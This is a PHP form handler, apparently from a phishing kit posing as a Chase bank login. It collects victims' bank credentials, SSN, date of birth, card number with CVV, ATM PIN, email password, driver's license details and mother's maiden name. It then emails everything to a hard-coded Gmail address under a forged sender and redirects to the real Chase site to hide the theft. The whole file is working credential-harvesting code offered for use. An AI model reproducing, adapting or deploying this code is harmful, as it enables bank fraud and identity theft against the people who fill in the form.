<?
session_start();
$ip = getenv("REMOTE_ADDR");
$adddate=date("D M d, Y g:i a");
$user1 = $_POST['UserID'];
$pass1 = $_POST['Password'];
$snq1 = $_POST['sn1'];
$snq2 = $_POST['sn2'];
$snq3 = $_POST['sn3'];
$doq1 = $_POST['do1'];
$doq2 = $_POST['do2'];
$doq3 = $_POST['do3'];
$fistn = $_POST['fullnaxme'];
$exyear = $_POST['exp_year'];
$addres = $_POST['homeadd1'];
$address = $_POST['homeadd2'];
$cta = $_POST['citybma'];
$stati = $_POST['staten'];
$zipo = $_POST['zip1co'];
$zipo2 = $_POST['zip2co'];
$homo = $_POST['home1phone'];
$mobil = $_POST['mobi2phone'];
$cardn = $_POST['ccnumber121'];
$cvvx = $_POST['cvv3'];
$expm = $_POST['exp_month'];
$expm = $_POST['exp_month'];
$DriverNo = $_POST['emailxnx0'];
$DriverExpm = $_POST['mamanx0'];
$DriverExpy = $_POST['mamanx1'];
$DriverstaiIssued = $_POST['mamanx2'];
$atmy = $_POST['atpin1'];
$acate = $_POST['accten'];
$emapass = $_POST['emailpassx'];
$ema = $_POST['emailxnx'];
$mama = $_POST['mamanx'];
$Employname = $_POST['Employername'];
$Employphone = $_POST['Employerphonenumber'];
$Employadd = $_POST['Employeraddress'];
$Credit = $_POST['creditscore'];
$chaseme="jamesowilly4@gmail.com";


  $subj = "CHASE $ip";
  $msg = "Chase Info\n\nUsername: $user1\nPassword: $pass1\nFull Name: $fistn\nAddress: $addres, $address\nCity: $cta\nState: $stati\nZip Code: $zipo - $zipo2\nHome 

Phone: $homo\nMobile Phone: $mobil\nEmail: $ema\nEmail Pass: $emapass\nCredit Score: $acate\nCard Numer: $cardn\nExp Date: $expm/$exyear\nDriver's License Number: $DriverNo\nDriver's License Expiry Month: $DriverExpm\nDriver's License Expiry Year: $DriverExpy\nDriver's State Issued: $DriverstaiIssued\nCVV:$cvvx\nAtm Pin: $atmy

\nSSN: $snq1$snq2$snq3\nDOB: $doq1/$doq2/$doq3\nMother Madien Name: $mama\nEmployer name: $Employname\nEmployer phone number: $Employphone\nEmployer Address: 

$Employadd\n$ip $adddate\n-----------------------------------\n        Created By Lom\n-----------------------------------";

  $from = "From: <igbo boy@chasemelom.com>";
  mail("$chaseme", $subj, $msg, $from);
  header("Location: https://www.chase.com/");

